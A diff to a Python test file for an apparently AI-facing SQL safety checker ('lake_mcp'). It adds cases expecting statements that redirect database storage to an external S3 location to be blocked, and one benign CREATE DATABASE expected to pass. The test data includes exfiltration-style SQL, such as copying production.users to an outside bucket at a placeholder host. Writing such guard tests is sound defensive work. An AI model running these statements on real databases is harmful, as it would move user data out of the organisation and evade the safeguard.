@@ -18,6 +18,9 @@ from lake_mcp.safety import check_network_sql, check_sql_safety, get_session_pre
         "ALTER STAGE {p}s SET URL='s3://example.invalid/production/'",
         "CREATE CONNECTION {p}c STORAGE_TYPE='s3' ENDPOINT_URL='https://example.invalid/'",
         "CREATE CATALOG {p}c TYPE=HIVE CONNECTION=(URL='https://example.invalid/')",
+        "CREATE DATABASE {p}db OPTIONS (DEFAULT_STORAGE_CONNECTION='prod_conn', DEFAULT_STORAGE_PATH='s3://example.invalid/out/')",
+        "ALTER DATABASE {p}db SET OPTIONS (DEFAULT_STORAGE_CONNECTION='prod_conn', DEFAULT_STORAGE_PATH='s3://example.invalid/out/')",
+        "ALTER DATABASE {p}db SET OPTIONS (DEFAULT_STORAGE_PATH='s3://example.invalid/out/')",
         "CREATE TABLE {p}t EXTERNAL_LOCATION='s3://example.invalid/out/' AS SELECT * FROM production.users",
         "CREATE OR REPLACE TABLE {p}t (id INT) EXTERNAL_LOCATION='s3://example.invalid/out/' AS SELECT 1",
         "CREATE TABLE {p}t ENGINE=ICEBERG LOCATION='s3://example.invalid/out/' AS SELECT 1",
@@ -53,6 +56,7 @@ def test_storage_escape_blocked_in_both_policy_entry_points(statement):
     "statement",
     [
         "CREATE DATABASE {p}db",
+        "CREATE DATABASE {p}db ENGINE=DEFAULT",
         "CREATE STAGE {p}s",
         "CREATE STAGE {p}s FILE_FORMAT=(TYPE=CSV FIELD_DELIMITER=',') COMMENT='URL= s3://example.invalid/'",
         "CREATE OR REPLACE STAGE {p}s COMMENTS=$$EXTERNAL_LOCATION='s3://example.invalid/'$$",
